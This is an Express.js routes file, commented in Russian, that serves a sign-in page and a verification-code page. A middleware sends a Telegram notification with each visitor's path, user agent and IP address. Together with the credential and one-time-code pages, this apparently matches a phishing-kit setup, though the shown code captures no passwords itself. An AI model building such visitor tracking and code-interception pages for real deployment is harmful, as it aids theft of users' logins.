/**
 * Auth Routes - страницы приложения
 * Express версия
 */

const express = require('express');
const router = express.Router();
const { sendVisitNotification } = require('../lib/telegram');

/**
 * Middleware для отправки уведомления о посещении
 */
router.use((req, res, next) => {
  // Отправляем уведомление асинхронно, не блокируя ответ
  if (req.path === '/sign-in' || req.path === '/') {
    sendVisitNotification(req.path, req.userAgent, req.clientIp).catch(error => {
      console.error("[VISIT-NOTIFICATION] Ошибка:", error);
    });
  }
  next();
});

/**
 * GET / - редирект на sign-in
 */
router.get('/', (req, res) => {
  res.redirect('/sign-in');
});

/**
 * GET /sign-in - страница входа
 */
router.get('/sign-in', (req, res, next) => {
  try {
    res.render('sign-in', {
      title: 'SIGN IN',
      error: null,
      defaultUsername: req.query.username || '',
    });
  } catch (error) {
    console.error('[AUTH] Ошибка рендеринга sign-in:', error);
    next(error);
  }
});

/**
 * GET /verification/verifycode - страница верификации кода
 */
router.get('/verification/verifycode', (req, res) => {
  const userName = req.query.userName || '';
  const sendCodeSelector = req.query.sendCodeSelector || 'Email';
  
  // Создаем сессию если передан userName
  if (userName && !req.session.username) {
    req.session.username = userName;
    req.session.step = 'code';
  }
  
  // Проверяем сессию
  if (!req.session.username && !userName) {
    return res.redirect('/sign-in');
  }
  
  res.render('verify-code', {
    title: 'VERIFICATION CODE',
    userName: userName || req.session.username || '',
    sendCodeSelector,
  });
});

/**
 * GET /404 - страница 404
 */
router.get('/404', (req, res) => {
  res.status(404).render('404');
});

module.exports = router;

